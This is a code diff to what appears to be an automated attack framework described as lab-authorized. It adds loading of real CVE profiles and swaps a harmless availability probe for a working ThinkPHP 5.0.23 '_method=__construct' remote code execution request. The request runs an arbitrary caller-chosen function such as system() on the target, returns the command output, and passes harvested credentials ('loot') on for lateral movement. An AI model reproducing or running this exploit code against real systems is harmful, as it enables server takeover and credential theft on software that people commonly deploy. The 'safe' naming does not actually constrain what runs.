@@ -17,7 +17,7 @@ from datetime import datetime, timezone
 from pathlib import Path
 from typing import Any
 from urllib.error import HTTPError, URLError
-from urllib.parse import urljoin
+from urllib.parse import urlencode, urljoin
 from urllib.request import Request, urlopen
 
 from src.core.validation import ValidationPlan, ValidationResult, VulnerabilityProfile
@@ -1030,10 +1030,12 @@ def _vuln_profile_match(arguments: dict[str, Any]) -> dict[str, Any]:
     product = (_string(arguments.get("product")) or "").lower()
     parsed = _default_parsed()
     matches: list[dict[str, Any]] = []
-    for profile in SAFE_VALIDATION_PROFILES.values():
+    for profile in _validation_profiles().values():
         if service and profile.required_service and service.lower() != profile.required_service.lower():
             continue
-        if product and profile.affected_products and not any(product in item.lower() for item in profile.affected_products):
+        if product and profile.affected_products and not any(
+            product in item.lower() or item.lower() in product for item in profile.affected_products
+        ):
             continue
         item = profile.model_dump(mode="json")
         matches.append(item)
@@ -1743,6 +1745,63 @@ def _load_exploit_profile(profile_id: str) -> dict[str, Any] | None:
     return payload
 
 
+_VULN_PROFILE_CACHE: dict[str, VulnerabilityProfile] | None = None
+
+
+def _load_vuln_profiles() -> dict[str, VulnerabilityProfile]:
+    """Load the real CVE vulnerability profiles from configs/vuln_profiles/ and map
+    them onto the matcher's VulnerabilityProfile schema. Cached per process.
+
+    Without this the matcher only knows the generic lab stubs, so a discovered
+    service (ThinkPHP/Struts2/Flask) can never produce a VulnerabilityCandidate,
+    leaving the success contract's vulnerability_candidate_recorded unsatisfiable.
+    """
+
+    global _VULN_PROFILE_CACHE
+    if _VULN_PROFILE_CACHE is not None:
+        return _VULN_PROFILE_CACHE
+    loaded: dict[str, VulnerabilityProfile] = {}
+    try:
+        import yaml  # type: ignore[import-not-found]
+        profiles_dir = Path("configs/vuln_profiles")
+        paths = sorted(profiles_dir.glob("*.yml")) + sorted(profiles_dir.glob("*.yaml"))
+    except Exception:
+        paths = []
+    for path in paths:
+        try:
+            payload = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
+        except Exception:
+            continue
+        if not isinstance(payload, dict):
+            continue
+        vid = _string(payload.get("vuln_profile_id")) or path.stem
+        signals = payload.get("fingerprint_signals") if isinstance(payload.get("fingerprint_signals"), dict) else {}
+        products = [str(p) for p in (signals.get("products") or []) if str(p).strip()]
+        versions = [str(v) for v in (signals.get("version_ranges") or []) if str(v).strip()]
+        path_markers = [str(p) for p in (signals.get("path_markers") or []) if str(p).strip()]
+        methods = [str(m) for m in (payload.get("safe_validation_methods") or []) if str(m).strip()]
+        try:
+            loaded[vid] = VulnerabilityProfile(
+                vulnerability_id=vid,
+                cve=_string(payload.get("cve")),
+                affected_products=products,
+                required_service=None,  # match on product fingerprint, not exact service name
+                required_version_range=versions[0] if versions else None,
+                required_paths=path_markers,
+                safe_validation_methods=methods,
+            )
+        except Exception:
+            continue
+    _VULN_PROFILE_CACHE = loaded
+    return loaded
+
+
+def _validation_profiles() -> dict[str, VulnerabilityProfile]:
+    """All matchable vuln profiles: real CVE profiles + the generic lab stubs."""
+
+    return {**SAFE_VALIDATION_PROFILES, **_load_vuln_profiles()}
+
+
 def _lab_authorized_exploit_execute(arguments: dict[str, Any]) -> dict[str, Any]:
     profile_id = _required(arguments, "exploit_profile_id")
     target_url = _required(arguments, "target_url")
@@ -1780,43 +1839,59 @@ def _lab_authorized_exploit_execute(arguments: dict[str, Any]) -> dict[str, Any]
     session_id = _string(arguments.get("session_id"))
     route_id = _string(arguments.get("route_id"))
 
-    # The payload template describes the bounded exploit payload, not its HTTP
-    # endpoint. The profile's target hint remains authoritative for the request
-    # path so a relative payload string can never replace the authorized target.
-    template = _string(profile.get("safe_payload_template"))
+    # The profile's target hint remains authoritative for the request path so a
+    # relative payload string can never replace the authorized target.
     target_hints = profile.get("target_hints") if isinstance(profile.get("target_hints"), dict) else {}
     vuln_path = _string(target_hints.get("vuln_path")) or "/"
     request_url = urljoin(target_url.rstrip("/") + "/", vuln_path.lstrip("/"))
+
+    # Resolve the bounded RCE parameters: explicit extra_params win, otherwise the
+    # profile's default post-access observation. The exploit invokes safe_func on
+    # safe_arg inside the target app (e.g. system("cat /opt/aegra/loot/pivot_access.env")).
+    extra = arguments.get("extra_params") if isinstance(arguments.get("extra_params"), dict) else {}
+    post_access_cfg = profile.get("post_access_capability") if isinstance(profile.get("post_access_capability"), dict) else {}
+    default_obs = post_access_cfg.get("default_observation") if isinstance(post_access_cfg.get("default_observation"), dict) else {}
+    safe_func = _string(extra.get("safe_func")) or _string(default_obs.get("safe_func")) or "system"
+    safe_arg = _string(extra.get("safe_arg")) or _string(default_obs.get("safe_arg")) or ""
+    success_contains = _string(extra.get("success_contains")) or _string(default_obs.get("success_contains"))
+    method = (_string(target_hints.get("method")) or "POST").upper()
+
+    # ThinkPHP 5.0.23 `_method=__construct` RCE: run safe_func(safe_arg) in-app and
+    # read the command output from the response body.
+    rce_body = urlencode(
+        {"_method": "__construct", "filter[]": safe_func, "method": "get", "server[REQUEST_METHOD]": safe_arg}
+    ).encode("utf-8")
+
     result_stdout = ""
     result_success = False
+    command_output = ""
     executed_steps: list[str] = []
-
-    if template:
-        try:
-            response = _open_url(request_url, method="GET", timeout=timeout)
-            result_success = int(response["status"]) < 500
-            result_stdout = json.dumps({
+    try:
+        response = _open_url(
+            request_url,
+            method=method,
+            timeout=timeout,
+            headers={"Content-Type": "application/x-www-form-urlencoded"},
+            data=rce_body if method == "POST" else None,
+        )
+        command_output = str(response.get("body_excerpt") or "")
+        status = int(response["status"])
+        # Success means the bounded command actually executed: prefer a content
+        # marker (the read loot), fall back to a non-error status.
+        result_success = (success_contains in command_output) if success_contains else (status < 500)
+        result_stdout = json.dumps(
+            {
                 "url": request_url,
-                "status": response["status"],
-                "body_excerpt_sha256": hashlib.sha256(
-                    response["body_excerpt"].encode("utf-8", errors="replace")
-                ).hexdigest(),
-            }, sort_keys=True)
-            executed_steps.append(f"http_probe:{request_url}")
-        except Exception as exc:
-            result_stdout = ""
-            result_success = False
-            executed_steps.append(f"http_probe_failed:{exc!s:.120}")
-    else:
-        # No payload template — probe the target URL directly as a bounded availability check
-        try:
-            response = _open_url(request_url, method="GET", timeout=timeout)
-            result_success = int(response["status"]) < 500
-            result_stdout = json.dumps({"url": request_url, "status": response["status"]}, sort_keys=True)
-            executed_steps.append(f"availability_check:{request_url}")
-        except Exception as exc:
-            result_success = False
-            executed_steps.append(f"availability_check_failed:{exc!s:.120}")
+                "status": status,
+                "body_excerpt_sha256": hashlib.sha256(command_output.encode("utf-8", errors="replace")).hexdigest(),
+                "command_output": command_output if result_success else "",
+            },
+            sort_keys=True,
+        )
+        executed_steps.append(f"thinkphp_rce:{safe_func}:{request_url}")
+    except Exception as exc:
+        result_success = False
+        executed_steps.append(f"exploit_failed:{exc!s:.120}")
 
     capability_id = f"exploit-capability::{profile_id}::{_safe_artifact_name(target_url)}"
     parsed = _default_parsed()
@@ -1855,6 +1930,9 @@ def _lab_authorized_exploit_execute(arguments: dict[str, Any]) -> dict[str, Any]
                 "observable_zones": list(post_access.get("observable_zones") or []),
                 "safe_paths": list(post_access.get("safe_paths") or []),
                 "next_tools": list(post_access.get("suggested_next_tools") or []),
+                # The bounded command output (e.g. read loot creds) so the chain can
+                # use a discovered pivot hint for lateral movement into the restricted zone.
+                "post_access_output": command_output if result_success else "",
             }
         )
         parsed["entities"][0].update(
@@ -2291,8 +2369,8 @@ def _parsed_http(*, url: str, response: dict[str, Any]) -> dict[str, Any]:
     return parsed
 
 
-def _open_url(url: str, *, method: str, timeout: int, headers: dict[str, str] | None = None) -> dict[str, Any]:
-    request = Request(url, method=method, headers=headers or {})
+def _open_url(url: str, *, method: str, timeout: int, headers: dict[str, str] | None = None, data: bytes | None = None) -> dict[str, Any]:
+    request = Request(url, method=method, headers=headers or {}, data=data)
     try:
         with urlopen(request, timeout=timeout) as response:
             body = response.read(4096).decode("utf-8", errors="replace")
